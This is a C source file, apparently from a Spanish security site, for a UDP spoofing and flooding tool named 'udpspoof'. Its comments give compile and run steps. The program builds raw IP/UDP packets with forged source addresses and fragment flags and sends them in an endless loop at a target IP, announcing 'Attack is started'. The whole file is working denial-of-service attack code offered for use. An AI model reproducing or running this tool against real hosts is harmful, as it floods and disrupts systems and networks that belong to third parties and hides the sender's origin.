// (c) hackingyseguridad.com
// Compilar a binario:
// gcc udpspoof.c -o udpspoof
// Ejecutar
// ./udpspoof IP
// envia paquetes a la IP con la ip origen suplantada
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <netinet/udp.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#ifdef STRANGE_BSD_BYTE_ORDERING_THING
#define change(n)  (n)
#else 
#define change(n)  htons(n)
#endif
#define ip_1   8193 
#define head     153    
#define u_head    41 
#define level 0
u_long p_rec(u_char *);
void running(u_char *);
void fragmentation(int, u_long, u_long, u_short, u_short, u_short);
int main(int argc, char **argv)
{
    
    int j = 1, i, socks, counter=1, number=1;
    u_long  s_ip = 0;
    u_long d_ip = 0;
    u_short s_port = 0;
  u_short d_port = 0;
  if((socks = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
   {
          perror("Error");
          exit(1);
   }
    if (setsockopt(socks, IPPROTO_IP, IP_HDRINCL, (char *)&j, sizeof(j)) < 0)
     {
          perror("Error");
          exit(1);
     }
  
    if (argc < 2) running(argv[0]);
    if (!(d_ip = p_rec(argv[1])))
    {
        exit(1);
    }
 
    fprintf(stderr, "Attack is started \n");
 
   for (;;) {
      counter ++;
      s_ip = counter*10;
      s_port = counter*10;
      d_port = counter+1*10;
      if (counter>10)
        counter = 1;
      for (i = 0; i < 10; i++)
      {
          fragmentation(socks, s_ip, d_ip, s_port, d_port, number++);
      }
    }
    return (0);
}
void fragmentation(int sock, u_long s_ip, u_long d_ip, u_short s_port,u_short d_port, u_short number)
{
    u_char *p = NULL, *pointer = NULL;   
    u_char byte;                            
    struct sockaddr_in sin;                 
 
    sin.sin_family      = AF_INET;
    sin.sin_port        = s_port;
    sin.sin_addr.s_addr = d_ip;
 
    p = (u_char *)malloc(head + u_head + level);
    pointer  = p;
     
    byte = 69;                       
    memcpy(pointer, &byte, sizeof(u_char));
    pointer += 2;                         
    *((u_short *)pointer) = change(head + u_head + level);    
    pointer += 2;
    *((u_short *)pointer) = htons(number);   
    pointer += 2;
    *((u_short *)pointer) |= change(ip_1);  
    pointer += 2;
    *((u_short *)pointer) = 247;         
    byte = IPPROTO_UDP;
    memcpy(pointer + 1, &byte, sizeof(u_char));
    pointer += 4;                         
    *((u_long *)pointer) = s_ip;        
    pointer += 4;
    *((u_long *)pointer) = d_ip;        
    pointer += 4;
    *((u_short *)pointer) = htons(s_port);       
    pointer += 2;
    *((u_short *)pointer) = htons(d_port);       
    pointer += 2;
    *((u_short *)pointer) = htons(8);
    if (sendto(sock, p, head + u_head + level, 0, (struct sockaddr *)&sin,
                 sizeof(struct sockaddr)) == -1)
     {
         perror("\nsendto");
         free(p);
         exit(1);
     }
    free(p);
}
u_long p_rec(u_char *host_name)
{
    struct in_addr addr;
    struct hostent *host_ent;
 
    if ((addr.s_addr = inet_addr(host_name)) == -1)
    {
        if (!(host_ent = gethostbyname(host_name))) return (0);
        bcopy(host_ent->h_addr, (char *)&addr.s_addr, host_ent->h_length);
    }
    return (addr.s_addr);
}
void running(u_char *name)
{
    fprintf(stderr,
            "%s d_ip\n",
            name);
    exit(0);
}
